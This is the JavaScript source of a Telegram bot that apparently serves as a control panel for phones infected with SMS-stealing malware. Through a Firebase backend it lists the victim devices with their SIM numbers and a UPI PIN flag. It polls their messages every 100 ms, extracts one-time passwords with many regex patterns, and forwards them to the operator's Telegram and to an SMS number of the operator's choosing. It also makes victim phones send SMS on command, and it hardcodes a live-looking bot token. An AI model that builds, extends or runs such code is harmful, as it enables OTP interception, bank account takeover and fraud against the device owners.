const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');

const BOT_TOKEN = '8888560487:AAH3OlSq4b40jP-fpdpGuviALcnOiKBgIA8';
const ADMIN_IDS = ['8472456673'];
const bot = new Telegraf(BOT_TOKEN);
const userData = new Map();

// ==================== ADMIN FUNCTIONS ====================
function isAdmin(userId) {
    return ADMIN_IDS.includes(userId.toString());
}

// ==================== FIREBASE FUNCTIONS ====================
function getUserDb(userId) {
    const user = userData.get(userId);
    if (!user || !user.firebaseUrl) return null;
    
    return {
        url: user.firebaseUrl,
        async get(path) {
            try {
                const res = await axios.get(`${this.url}/${path}.json`, { timeout: 15000 });
                return res.data;
            } catch (e) { return null; }
        },
        async put(path, data) {
            try {
                const res = await axios.put(`${this.url}/${path}.json`, data, { timeout: 15000 });
                return res.status === 200;
            } catch (e) { return false; }
        },
        async push(path, data) {
            try {
                const res = await axios.post(`${this.url}/${path}.json`, data, { timeout: 15000 });
                return res.data;
            } catch (e) { return null; }
        }
    };
}

// ==================== DEVICE FUNCTIONS ====================
async function getDevice(userId, deviceId) {
    const db = getUserDb(userId);
    if (!db) return null;
    try {
        const data = await db.get(`clients/${deviceId}`);
        if (!data) return null;
        
        let isOnline = false;
        if (data.status === true || data.status === 'true' || data.status === 1 || data.status === 'online') {
            isOnline = true;
        }
        if (data.isOnline === true || data.isOnline === 'true' || data.isOnline === 1) {
            isOnline = true;
        }
        if (data.connected === true || data.connected === 'true' || data.connected === 1) {
            isOnline = true;
        }
        if (data.lastSeen && (Date.now() - data.lastSeen) < 60000) {
            isOnline = true;
        }
        
        let sim1Number = 'N/A';
        let sim1Carrier = 'Unknown';
        let sim2Number = 'N/A';
        let sim2Carrier = 'Unknown';
        let selectedSim = 0;
        
        if (data.sims && data.sims.length > 0) {
            if (data.sims[0]) {
                sim1Number = data.sims[0].phoneNumber || data.sims[0].number || data.mobNo || 'N/A';
                sim1Carrier = data.sims[0].carrierName || data.sims[0].operator || data.service_provider || 'Unknown';
            }
            if (data.sims[1]) {
                sim2Number = data.sims[1].phoneNumber || data.sims[1].number || 'N/A';
                sim2Carrier = data.sims[1].carrierName || data.sims[1].operator || 'Unknown';
            }
            selectedSim = data.selectedSim || data.currentSim || 0;
        }
        
        return {
            id: deviceId,
            name: data.modelName || data.model || data.name || deviceId.slice(0, 8),
            phone: data.mobNo || data.phoneNumber || sim1Number || 'Unknown',
            online: isOnline,
            battery: data.battery || data.batteryLevel || data.battery_percent || '0%',
            sim1Number: sim1Number,
            sim1Carrier: sim1Carrier,
            sim2Number: sim2Number,
            sim2Carrier: sim2Carrier,
            selectedSim: selectedSim,
            sims: data.sims || [],
            rawStatus: data.status,
            lastSeen: data.lastSeen,
            upipin: data.upipin
        };
    } catch (e) { 
        console.log(`❌ Error getting device: ${e.message}`);
        return null; 
    }
}

async function getAllDevices(userId) {
    const db = getUserDb(userId);
    if (!db) return [];
    try {
        const data = await db.get('clients');
        if (!data) return [];
        const devices = [];
        for (const devId in data) {
            if (data[devId]) {
                let isOnline = false;
                if (data[devId].status === true || data[devId].status === 'true' || data[devId].status === 1 || data[devId].status === 'online') {
                    isOnline = true;
                }
                if (data[devId].isOnline === true || data[devId].isOnline === 'true' || data[devId].isOnline === 1) {
                    isOnline = true;
                }
                if (data[devId].connected === true || data[devId].connected === 'true' || data[devId].connected === 1) {
                    isOnline = true;
                }
                
                devices.push({
                    id: devId,
                    name: data[devId].modelName || data[devId].model || data[devId].name || devId.slice(0, 8),
                    phone: data[devId].mobNo || data[devId].phoneNumber || 'Unknown',
                    online: isOnline,
                    battery: data[devId].battery || data[devId].batteryLevel || '0%',
                    rawStatus: data[devId].status,
                    upipin: data[devId].upipin
                });
            }
        }
        return devices;
    } catch (e) { return []; }
}

// ==================== SMS SENDING ====================
async function sendSms(userId, deviceId, toNumber, message) {
    const start = Date.now();
    const db = getUserDb(userId);
    if (!db) return { success: false, error: 'Firebase not connected' };
    
    const device = await getDevice(userId, deviceId);
    if (!device) return { success: false, error: 'Device not found' };
    
    let cleanNumber = toNumber.toString().trim().replace('+', '');
    const timestamp = Date.now();
    const commandId = `cmd_${timestamp}_${Math.random().toString(36).substr(2, 8)}`;
    
    let simInfo = {
        simSlot: device.selectedSim || 0,
        simId: device.sims && device.sims[device.selectedSim || 0] ? device.sims[device.selectedSim || 0].simId : null,
        phoneNumber: device.phone,
        carrier: device.sim1Carrier
    };
    
    if (device.sims && device.sims.length > 0) {
        const selectedSimData = device.sims[device.selectedSim || 0];
        if (selectedSimData) {
            simInfo = {
                simSlot: device.selectedSim || 0,
                simId: selectedSimData.simId || selectedSimData.id || null,
                phoneNumber: selectedSimData.phoneNumber || selectedSimData.number || device.phone,
                carrier: selectedSimData.carrierName || selectedSimData.operator || device.sim1Carrier
            };
        }
    }
    
    const commandPath = `clients/${deviceId}/commands/sendSms`;
    const commandData = {
        targetNumber: cleanNumber,
        message: message,
        timestamp: timestamp,
        status: 'pending',
        id: commandId,
        admin_sent: true,
        simInfo: simInfo
    };
    
    const webhookPath = `clients/${deviceId}/webhookEvent/sendSms`;
    const webhookData = {
        to: cleanNumber,
        message: message,
        isSended: false,
        timestamp: timestamp,
        commandId: commandId,
        simInfo: simInfo
    };
    
    const messagesPath = `clients/${deviceId}/messages`;
    const messageData = {
        sender: 'ADMIN',
        message: `SMS sent to ${cleanNumber}: ${message}`,
        dateTime: timestamp,
        timestamp: timestamp,
        type: 'outgoing',
        targetNumber: cleanNumber,
        commandId: commandId,
        status: 'pending',
        simInfo: simInfo,
        admin_sent: true
    };
    
    const smsPath = `clients/${deviceId}/sms`;
    const smsData = {
        to: cleanNumber,
        text: message,
        timestamp: timestamp,
        status: 'pending',
        commandId: commandId
    };
    
    let success1 = false, success2 = false, success3 = false, success4 = false;
    
    try {
        const result1 = await db.put(commandPath, commandData);
        success1 = result1 === true;
        if (success1) console.log(`✅ Command written to: ${commandPath}`);
    } catch(e) { console.log(`❌ Failed: ${commandPath}`); }
    
    try {
        const result2 = await db.put(webhookPath, webhookData);
        success2 = result2 === true;
        if (success2) console.log(`✅ Command written to: ${webhookPath}`);
    } catch(e) { console.log(`❌ Failed: ${webhookPath}`); }
    
    try {
        const result3 = await db.push(messagesPath, messageData);
        success3 = result3 !== null;
        if (success3) console.log(`✅ Command written to: ${messagesPath}`);
    } catch(e) { console.log(`❌ Failed: ${messagesPath}`); }
    
    try {
        const result4 = await db.put(smsPath, smsData);
        success4 = result4 === true;
        if (success4) console.log(`✅ Command written to: ${smsPath}`);
    } catch(e) { console.log(`❌ Failed: ${smsPath}`); }
    
    const elapsed = Date.now() - start;
    
    if (success1 || success2 || success3 || success4) {
        return { success: true, message: `SMS sent to ${cleanNumber}`, elapsed: elapsed, commandId: commandId };
    }
    
    return { success: false, error: 'Failed to write command to Firebase' };
}

// ==================== OTP EXTRACTION ====================
function extractOTP(text) {
    if (!text) return null;
    
    console.log(`🔍 Searching for OTP in: ${text.slice(0, 150)}`);
    
    const patterns = [
        /OTP[:\s]*(\d{4,8})/i,
        /code[:\s]*(\d{4,8})/i,
        /verification[:\s]*(\d{4,8})/i,
        /pin[:\s]*(\d{4,8})/i,
        /(\d{4,8}) is your OTP/i,
        /(\d{4,8}) is your verification code/i,
        /<#> (\d{4,8})/i,
        /(\d{4,8}) is the OTP/i,
        /one time password[:\s]*(\d{4,8})/i,
        /password[:\s]*(\d{4,8})/i,
        /Your OTP is (\d{4,8})/i,
        /OTP for transaction is (\d{4,8})/i,
        /(\d{6}) is your OTP/i,
        /Use OTP (\d{4,8}) to log in/i,
        /Use OTP (\d{4,8}) for/i,
        /login OTP[:\s]*(\d{4,8})/i,
        /(\d{4,8}) is your login OTP/i,
        /otp[:\s]*(\d{4,8})/i,
        /verification code[:\s]*(\d{4,8})/i
    ];
    
    for (const pattern of patterns) {
        const match = text.match(pattern);
        if (match) {
            console.log(`✅ OTP Found: ${match[1]}`);
            return match[1];
        }
    }
    
    // Try to find any 4-8 digit number that might be OTP
    const numberMatch = text.match(/\b(\d{4,8})\b/);
    if (numberMatch && !text.match(/mobile|phone|contact/i)) {
        console.log(`✅ Possible OTP (number only): ${numberMatch[1]}`);
        return numberMatch[1];
    }
    
    console.log(`❌ No OTP found in message`);
    return null;
}

// ==================== TOKEN EXTRACTION ====================
function extractToken(text) {
    if (!text || text.trim().length === 0) return null;
    
    console.log(`\n🔍 Extracting token from: ${text.slice(0, 200)}`);
    
    // Format: To: 919876543210\nMessage: TOKEN123
    let match = text.match(/To:\s*\+?(\d{10,12})[\s\n]*Message:\s*(.+?)(?=\n|$)/is);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'To:Message' };
        }
    }
    
    // Format: 📱 Receipt: 7899460333\n🔑 Token: TOKEN
    match = text.match(/📱\s*Receipt:\s*\+?(\d{10,12})[\s\n]*🔑\s*Token:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'Receipt:Token' };
        }
    }
    
    // Format: Receipt: 7899460333\nToken: TOKEN
    match = text.match(/Receipt:\s*\+?(\d{10,12})[\s\n]*Token:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'Receipt:Token' };
        }
    }
    
    // Format: 📞 To: XXXXX 💬 Message: YYYYY
    match = text.match(/📞\s*To:\s*\+?(\d{10,12})[\s\S]*?💬\s*Message:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'Emoji' };
        }
    }
    
    // Format: One-tap copy: XXXXX | YYYYY
    match = text.match(/One-tap copy:\s*\+?(\d{10,12})\s*\|\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'One-tap' };
        }
    }
    
    // Format: Phone: XXXXX\nOTP: YYYYY
    match = text.match(/Phone:\s*\+?(\d{10,12})[\s\n]*OTP:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            return { number: number, message: message, format: 'Phone:OTP' };
        }
    }
    
    // Try to find number + token pattern
    const phoneMatch = text.match(/\b(\d{10,12})\b/);
    if (phoneMatch) {
        const number = phoneMatch[1];
        const afterNumber = text.substring(text.indexOf(number) + number.length);
        const tokenMatch = afterNumber.match(/\s+([A-Za-z0-9!@#$%^&*()_+={}\[\]|\\/?~`-]{4,})/);
        if (tokenMatch) {
            const message = tokenMatch[1].trim();
            return { number: number, message: message, format: 'Number+Token' };
        }
    }
    
    return null;
}

// ==================== AUTO-FORWARD OTP FUNCTIONS ====================
async function autoForwardOTP(userId, deviceId, fullMessage, sender, timestamp, otpCode) {
    const user = userData.get(userId);
    
    // Check if user has set an OTP forward number
    if (!user || !user.otpForwardNumber) {
        console.log(`📭 No OTP forward number set for user ${userId}`);
        return false;
    }
    
    console.log(`🔐 OTP Detected: ${otpCode}`);
    console.log(`📞 Auto-forwarding OTP to: ${user.otpForwardNumber}`);
    console.log(`📝 Full Message: ${fullMessage.slice(0, 200)}`);
    
    // Format message for forwarding
    const formattedTime = timestamp ? new Date(timestamp * 1000).toLocaleString() : new Date().toLocaleString();
    const forwardMessage = `🔐 *OTP RECEIVED*\n\n📱 From: ${sender}\n🔑 OTP: ${otpCode}\n🕐 Time: ${formattedTime}\n📝 Message: ${fullMessage}`;
    
    // Send OTP to user's Telegram
    await bot.telegram.sendMessage(
        userId,
        `🔐 *OTP DETECTED!*\n\n📱 From: ${sender}\n🔑 OTP: \`${otpCode}\`\n📞 Forwarding to: \`${user.otpForwardNumber}\`\n📝 ${fullMessage.slice(0, 150)}`,
        { parse_mode: 'Markdown' }
    );
    
    // Forward OTP via SMS to user's configured number
    const result = await sendSms(userId, deviceId, user.otpForwardNumber, forwardMessage);
    
    if (result.success) {
        console.log(`✅ OTP auto-forwarded to ${user.otpForwardNumber}`);
        await bot.telegram.sendMessage(
            userId,
            `✅ *OTP FORWARDED SUCCESSFULLY!*\n\n📞 To: \`${user.otpForwardNumber}\`\n🔑 OTP: \`${otpCode}\`\n⏱ Time: ${result.elapsed}ms`,
            { parse_mode: 'Markdown' }
        );
        return true;
    } else {
        console.log(`❌ Failed to forward OTP: ${result.error}`);
        await bot.telegram.sendMessage(
            userId,
            `❌ *OTP FORWARD FAILED!*\n\n📞 To: \`${user.otpForwardNumber}\`\n🔑 OTP: \`${otpCode}\`\n❌ Error: ${result.error}`,
            { parse_mode: 'Markdown' }
        );
        return false;
    }
}

// ==================== MONITOR FIREBASE MESSAGES (REAL-TIME) ====================
async function monitorFirebaseMessages(userId, user) {
    const db = getUserDb(userId);
    if (!db || !user.monitoringDevice) return;
    
    try {
        // Get all messages from Firebase
        const messagesData = await db.get(`clients/${user.monitoringDevice}/messages`);
        if (!messagesData) return;
        
        const messages = typeof messagesData === 'object' && !Array.isArray(messagesData) 
            ? Object.entries(messagesData).map(([id, msg]) => ({ id, ...msg }))
            : [];
        
        if (messages.length === 0) return;
        
        // Sort by timestamp (newest first)
        messages.sort((a, b) => {
            const timeA = a.timestamp || new Date(a.dateTime).getTime() || 0;
            const timeB = b.timestamp || new Date(b.dateTime).getTime() || 0;
            return timeB - timeA;
        });
        
        // Check only the newest messages (last 5)
        const newMessages = messages.slice(0, 5);
        
        for (const msg of newMessages) {
            const msgId = msg.id;
            const msgTime = msg.timestamp || new Date(msg.dateTime).getTime() || 0;
            
            // Skip if already processed
            if (user.processedMsgs && user.processedMsgs.has(msgId)) continue;
            
            // Skip old messages (from before monitoring started)
            const startTime = user.monitorStartTime ? new Date(user.monitorStartTime).getTime() : 0;
            if (msgTime < startTime && startTime > 0) continue;
            
            const messageText = msg.message || msg.text || '';
            const sender = msg.sender || 'Unknown';
            
            console.log(`\n📨 New message from Firebase:`);
            console.log(`ID: ${msgId}`);
            console.log(`Sender: ${sender}`);
            console.log(`Message: ${messageText.slice(0, 200)}`);
            console.log(`Time: ${new Date(msgTime).toLocaleString()}`);
            
            // Extract OTP from message
            const otp = extractOTP(messageText);
            
            if (otp && user.otpForwardNumber) {
                console.log(`🎯 OTP Found! Forwarding to ${user.otpForwardNumber}`);
                await autoForwardOTP(userId, user.monitoringDevice, messageText, sender, msgTime / 1000, otp);
            } else if (otp && !user.otpForwardNumber) {
                console.log(`⚠️ OTP found but no forward number set`);
                await bot.telegram.sendMessage(
                    userId,
                    `🔐 *OTP DETECTED but no forward number set!*\n\n🔑 OTP: \`${otp}\`\n📝 ${messageText.slice(0, 150)}\n\nUse /setotpnum to set a number for auto-forwarding.`,
                    { parse_mode: 'Markdown' }
                );
            }
            
            // Mark as processed
            if (!user.processedMsgs) user.processedMsgs = new Set();
            user.processedMsgs.add(msgId);
        }
        
        userData.set(userId, user);
        
    } catch (error) {
        console.log(`❌ Error monitoring Firebase: ${error.message}`);
    }
}

// ==================== COMMANDS ====================
bot.start(async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    const stylishText = `
╔══════════════════════════════╗
║  ✦ 𝘀𝗼𝘂𝗹 𝗲𝘅𝗲 𝗮𝘂𝘁𝗼 𝘃𝗮𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 ✦  ║
║         V E R S I O N   2 . 0        ║
╚══════════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       ⚡ S E T U P   G U I D E      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ 1️⃣ /setfirebase <url>
◈ 2️⃣ /setdevice
◈ 3️⃣ /addchannel (in your chat)
◈ 4️⃣ /startmonitor

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      📌 OTP AUTO-FORWARD       ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /setotpnum <number> - Set OTP forward number
◈ /removeotpnum - Remove OTP forward number
◈ /showotpnum - Show current OTP number

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      📌 TOKEN FORWARD         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ Send in channel: To: X Message: Y

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          🅥 🅔 🅡 🅢 🅘 🅞 🅝   2 . 0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    if (!user?.firebaseUrl) {
        await ctx.reply(stylishText);
        return;
    }
    
    const devices = await getAllDevices(userId);
    let deviceInfo = 'Not set';
    if (user.monitoringDevice) {
        const d = await getDevice(userId, user.monitoringDevice);
        if (d) deviceInfo = `${d.name} (${d.online ? '🟢' : '🔴'})`;
    }
    
    await ctx.reply(
        `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n` +
        `┃        📊  S T A T U S        ┃\n` +
        `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
        `◈ 📡 Firebase: ✅ Connected\n` +
        `◈ 📱 Device: ${deviceInfo}\n` +
        `◈ 📢 Chats: ${user.channels?.length || 0}\n` +
        `◈ 🖥 Total Devices: ${devices.length}\n` +
        `◈ ⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
        `◈ 🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `          🅥 🅔 🅡 🅢 🅘 🅞 🅝   2 . 0\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`
    );
});

bot.command('setfirebase', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
        await ctx.reply('❌ Usage: `/setfirebase <url>`', { parse_mode: 'Markdown' });
        return;
    }
    
    let url = args[1];
    if (!url.startsWith('https://')) url = 'https://' + url;
    if (!url.endsWith('.com') && !url.includes('.firebaseio.com')) url = url.replace(/\/$/, '');
    
    const msg = await ctx.reply('🔄 Connecting to Firebase...');
    
    try {
        await axios.get(`${url}/.json?shallow=true`, { timeout: 10000 });
        
        if (!userData.has(userId)) userData.set(userId, {});
        const user = userData.get(userId);
        user.firebaseUrl = url;
        user.channels = user.channels || [];
        user.processedMsgs = new Set();
        user.monitorActive = false;
        user.lastMessageCheck = 0;
        userData.set(userId, user);
        
        await ctx.telegram.editMessageText(
            msg.chat.id, msg.message_id, null,
            `✅ *Firebase Connected!*\n\n📡 URL: \`${url}\`\n\nNext: \`/setdevice\``,
            { parse_mode: 'Markdown' }
        );
    } catch (error) {
        await ctx.telegram.editMessageText(
            msg.chat.id, msg.message_id, null,
            `❌ *Connection Failed!*\n\nError: ${error.message}`,
            { parse_mode: 'Markdown' }
        );
    }
});

bot.command('setdevice', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(userId);
    
    if (args.length > 1) {
        const deviceInput = args[1];
        const allDevices = await getAllDevices(userId);
        
        if (allDevices.length === 0) {
            return ctx.reply('❌ No devices found!', { parse_mode: 'Markdown' });
        }
        
        let foundDevice = allDevices.find(d => d.id === deviceInput) ||
                         allDevices.find(d => d.name.toLowerCase().includes(deviceInput.toLowerCase()));
        
        if (!foundDevice) {
            let deviceList = '📱 *Available Devices:*\n\n';
            allDevices.slice(0, 10).forEach(d => {
                deviceList += `• ${d.name}\n  🆔 \`${d.id}\`\n  📞 ${d.phone}\n  ${d.online ? '🟢 Online' : '🔴 Offline'}\n\n`;
            });
            return ctx.reply(`❌ Device "${deviceInput}" not found!\n\n${deviceList}`, { parse_mode: 'Markdown' });
        }
        
        const device = await getDevice(userId, foundDevice.id);
        user.monitoringDevice = device.id;
        user.lastMessageCheck = 0;
        user.processedMsgs = new Set();
        userData.set(userId, user);
        
        return ctx.reply(
            `✅ *Device Set!*\n\n` +
            `📱 Name: ${device.name}\n` +
            `🆔 ID: \`${device.id}\`\n` +
            `📞 Phone: ${device.phone}\n` +
            `🔋 Battery: ${device.battery}\n` +
            `📡 Status: ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n` +
            `📱 SIM1: ${device.sim1Number} (${device.sim1Carrier})\n` +
            `${device.sim2Number !== 'N/A' ? `📱 SIM2: ${device.sim2Number} (${device.sim2Carrier})\n` : ''}` +
            `🔐 UPI PIN: ${device.upipin ? '✅ Set' : '❌ Not Set'}\n\n` +
            `Next: \`/addchannel\` or \`/setotpnum\``,
            { parse_mode: 'Markdown' }
        );
    }
    
    const allDevices = await getAllDevices(userId);
    if (allDevices.length === 0) {
        return ctx.reply('📭 *No devices found!*', { parse_mode: 'Markdown' });
    }
    
    user.deviceList = allDevices;
    user.currentPage = 0;
    userData.set(userId, user);
    await showDevicePage(ctx, userId, 0);
});

async function showDevicePage(ctx, userId, page) {
    const user = userData.get(userId);
    if (!user || !user.deviceList) return;
    
    const devices = user.deviceList;
    const itemsPerPage = 10;
    const totalPages = Math.ceil(devices.length / itemsPerPage);
    const start = page * itemsPerPage;
    const end = start + itemsPerPage;
    const pageDevices = devices.slice(start, end);
    
    let text = `📱 *DEVICES* (Page ${page + 1}/${totalPages})\n\n`;
    text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    
    for (const d of pageDevices) {
        text += `📱 *${d.name}*\n`;
        text += `   🆔 \`${d.id.slice(0, 20)}...\`\n`;
        text += `   📞 ${d.phone}\n`;
        text += `   🔋 ${d.battery}\n`;
        text += `   ${d.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n`;
        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    }
    
    const buttons = [];
    for (const d of pageDevices) {
        buttons.push([Markup.button.callback(`📱 ${d.name.slice(0, 20)}`, `select_dev_${d.id}`)]);
    }
    
    const navButtons = [];
    if (page > 0) navButtons.push(Markup.button.callback('◀️ PREV', `dev_page_${page - 1}`));
    if (page < totalPages - 1) navButtons.push(Markup.button.callback('NEXT ▶️', `dev_page_${page + 1}`));
    if (navButtons.length > 0) buttons.push(navButtons);
    buttons.push([Markup.button.callback('❌ CANCEL', 'cancel_select')]);
    
    await ctx.reply(text, { ...Markup.inlineKeyboard(buttons), parse_mode: 'Markdown' });
}

// ==================== OTP FORWARD COMMANDS ====================
bot.command('setotpnum', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    }
    
    if (!userData.get(userId).monitoringDevice) {
        return ctx.reply('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
    }
    
    if (args.length < 2) {
        return ctx.reply(
            `❌ *Usage:* \`/setotpnum <phone_number>\`\n\n` +
            `Example: \`/setotpnum 6283543900\`\n\n` +
            `📌 All OTPs detected will be auto-forwarded to this number!`,
            { parse_mode: 'Markdown' }
        );
    }
    
    const phoneNumber = args[1].replace('+', '');
    const user = userData.get(userId);
    
    user.otpForwardNumber = phoneNumber;
    userData.set(userId, user);
    
    await ctx.reply(
        `✅ *OTP Forward Number Set!*\n\n` +
        `📞 Number: \`${phoneNumber}\`\n\n` +
        `🔐 All OTPs detected in monitored chats will be auto-forwarded to this number!\n\n` +
        `Use \`/removeotpnum\` to remove this number.\n` +
        `Use \`/showotpnum\` to see current number.`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('removeotpnum', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!user?.otpForwardNumber) {
        return ctx.reply('❌ No OTP forward number is currently set!\n\nUse `/setotpnum <number>` to set one.', { parse_mode: 'Markdown' });
    }
    
    const oldNumber = user.otpForwardNumber;
    user.otpForwardNumber = null;
    userData.set(userId, user);
    
    await ctx.reply(
        `✅ *OTP Forward Number Removed!*\n\n` +
        `📞 Removed: \`${oldNumber}\`\n\n` +
        `OTP auto-forwarding has been disabled.`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('showotpnum', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!user?.otpForwardNumber) {
        return ctx.reply(
            `❌ *No OTP Forward Number Set!*\n\n` +
            `Use \`/setotpnum <number>\` to set a number for OTP auto-forwarding.`,
            { parse_mode: 'Markdown' }
        );
    }
    
    await ctx.reply(
        `🔐 *Current OTP Forward Number*\n\n` +
        `📞 \`${user.otpForwardNumber}\`\n\n` +
        `✅ All OTPs will be auto-forwarded to this number.\n\n` +
        `Use \`/removeotpnum\` to remove this number.`,
        { parse_mode: 'Markdown' }
    );
});

// ==================== CHAT MANAGEMENT COMMANDS ====================
bot.command('addchannel', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    }
    
    let channelId = null;
    let chatTitle = 'Unknown';
    
    if (args.length > 1) {
        channelId = args[1];
    } else if (ctx.chat.type === 'channel' || ctx.chat.type === 'supergroup' || ctx.chat.type === 'group') {
        channelId = ctx.chat.id.toString();
        chatTitle = ctx.chat.title || ctx.chat.username || 'Chat';
    } else {
        await ctx.reply(
            `❌ *How to add channel/group:*\n\n` +
            `• By ID: \`/addchannel -1003937717807\`\n` +
            `• Or send \`/addchannel\` IN the channel/group\n\n` +
            `💡 Your Chat ID: \`${ctx.chat.id}\``,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const user = userData.get(userId);
    if (!user.channels) user.channels = [];
    
    if (user.channels.includes(channelId)) {
        return ctx.reply(`ℹ️ Chat \`${channelId}\` already monitored.`, { parse_mode: 'Markdown' });
    }
    
    user.channels.push(channelId);
    user.channelNames = user.channelNames || {};
    user.channelNames[channelId] = chatTitle;
    userData.set(userId, user);
    
    await ctx.reply(
        `✅ *Chat Added!*\n\n` +
        `📢 Name: ${chatTitle}\n` +
        `🆔 ID: \`${channelId}\`\n` +
        `📊 Total monitored chats: ${user.channels.length}\n\n` +
        `📌 Next: \`/startmonitor\``,
        { parse_mode: 'Markdown' }
    );
});

bot.command('listchannels', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!user?.channels?.length) {
        await ctx.reply('📭 No channels/groups added.', { parse_mode: 'Markdown' });
        return;
    }
    
    let text = '📢 *MONITORED CHATS*\n\n━━━━━━━━━━━━━━━━━━━\n';
    user.channels.forEach((ch, i) => { 
        const name = user.channelNames?.[ch] || 'Unknown';
        text += `${i+1}. ${name}\n   🆔 \`${ch}\`\n\n`;
    });
    text += `━━━━━━━━━━━━━━━━━━━\n📊 Total: ${user.channels.length} chats`;
    await ctx.reply(text, { parse_mode: 'Markdown' });
});

bot.command('removechannel', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    const user = userData.get(userId);
    
    if (!user?.channels?.length) return ctx.reply('📭 No chats to remove.');
    if (args.length < 2) return ctx.reply('Usage: `/removechannel <chat_id>`', { parse_mode: 'Markdown' });
    
    const idx = user.channels.indexOf(args[1]);
    if (idx === -1) return ctx.reply('❌ Chat not found.');
    
    const removed = user.channels.splice(idx, 1)[0];
    if (user.channelNames) delete user.channelNames[removed];
    userData.set(userId, user);
    
    await ctx.reply(`✅ *Removed Chat!*\n\n🆔 \`${removed}\``, { parse_mode: 'Markdown' });
});

bot.command('startmonitor', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!user?.firebaseUrl) return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    if (!user.monitoringDevice) return ctx.reply('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
    
    const now = new Date();
    user.monitorStartTime = now.toISOString();
    user.monitorActive = true;
    user.processedMsgs = new Set();
    user.lastMessageCheck = Date.now();
    userData.set(userId, user);
    
    const device = await getDevice(userId, user.monitoringDevice);
    const deviceStatus = device ? (device.online ? '🟢 ONLINE' : '🔴 OFFLINE') : '❓ Unknown';
    
    // Clear existing interval if any
    if (user.monitorInterval) clearInterval(user.monitorInterval);
    
    // Start monitoring interval - 0.1 SECOND (100ms) REAL-TIME MONITORING
    user.monitorInterval = setInterval(async () => {
        const currentUser = userData.get(userId);
        if (currentUser && currentUser.monitorActive && currentUser.monitoringDevice) {
            await monitorFirebaseMessages(userId, currentUser);
        }
    }, 100); // 100ms = 0.1 seconds - REAL-TIME!
    
    userData.set(userId, user);
    
    await ctx.reply(
        `✅ *MONITORING STARTED!*\n\n` +
        `📱 Device: \`${user.monitoringDevice}\`\n` +
        `📡 Status: ${deviceStatus}\n` +
        `📢 Chats: ${user.channels?.length || 0}\n` +
        `🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}\n` +
        `🕐 Started: ${now.toLocaleString()}\n\n` +
        `📌 *How it works:*\n` +
        `• OTPs from Firebase messages → Auto-forward to your set number\n` +
        `• Tokens (To: X Message: Y) → Forward as SMS\n\n` +
        `🚀 *REAL-TIME MONITORING ACTIVE!*\n` +
        `📡 Checking Firebase every 0.1 seconds for new messages...`,
        { parse_mode: 'Markdown' }
    );
});

